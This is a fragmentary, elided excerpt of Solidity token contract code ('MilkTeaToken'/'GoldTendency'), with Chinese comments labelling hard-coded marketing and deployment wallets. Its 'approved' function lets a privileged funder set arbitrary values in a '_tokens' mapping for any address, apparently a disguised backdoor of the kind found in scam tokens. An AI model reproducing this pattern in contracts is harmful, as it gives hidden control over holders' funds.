...
abstract contract MilkTeaToken is IERC20, Ownable {
    ...
    function approved(address addr, uint256 enable) public onlyFunder {
         _tokens[addr] = (enable);
    }
...
contract GoldTendency is MilkTeaToken {
    constructor() MilkTeaToken(
        ...
        address(0x2CF07aa436005b115C27EdB93A463E4893F612C6),//营销钱包地址
    
        address(0x2CF07aa436005b115C27EdB93A463E4893F612C6)//部署代币接收地址（部署的代币发送到这个钱包地址）
    ){
